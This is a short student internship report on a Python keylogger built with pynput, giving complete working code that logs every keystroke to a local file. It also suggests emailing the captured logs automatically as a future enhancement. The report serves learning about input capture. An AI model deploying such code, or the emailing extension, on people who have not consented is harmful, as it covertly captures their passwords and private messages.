# PRODIGY_CS_04
# Keylogger Project using Python (For Educational Purposes Only)
# 1. Introduction
 In today's digital world, understanding how systems track input is crucial. This project focuses on building a basic
 keylogger using Python. The program records keystrokes and logs them to a text file. It is designed strictly for ethical
 learning and research purposes.
 # 2. Objective- Create a Python-based program that logs keystrokes.- Log both character and special keys.- Save the keystrokes in a readable format to a local file.
# 3. Tools & Technologies Used
 | Tool/Library       | Purpose                                |
 |--------------------|----------------------------------------|
 | Python             | Programming language                   |
 | pynput             | Capturing keyboard events              |
 | Visual Studio Code | Code editor used for development       |
# 4. Methodology- Used pynput's Listener to detect and respond to keyboard presses.- The listener writes each key to a file (`keylog.txt`).- It handles exceptions to record special keys such as ENTER, SHIFT etc.
# 5. Implementation
 ```python
 from pynput import keyboard
 log_file = "keylog.txt"
 def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
 with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
 ```
# 6. Output
 Keylogger Project Report- All keystrokes are recorded into keylog.txt.- Regular keys are logged as-is (e.g., a, b, 1).- Special keys appear like [Key.enter], [Key.space].
# 7. Results
 | Action   | Output File |
 |----------|-------------|
 | Logging  | keylog.txt  |
# 8. Conclusion
 This project introduces the core logic behind a keylogger and how to log input for user-based events. It emphasizes
 ethical responsibility and forms a strong base for understanding event-based programming.
# 9. Future Enhancements- Add timestamps to logs.- Secure logs using encryption.- Email log files automatically.- Build a GUI-based keylogger manager.
# 10. Acknowledgement
 I would like to thank Prodigy InfoTech for the opportunity to explore input logging through this internship project. It has
 helped me build practical understanding of Python and user-event tracking.
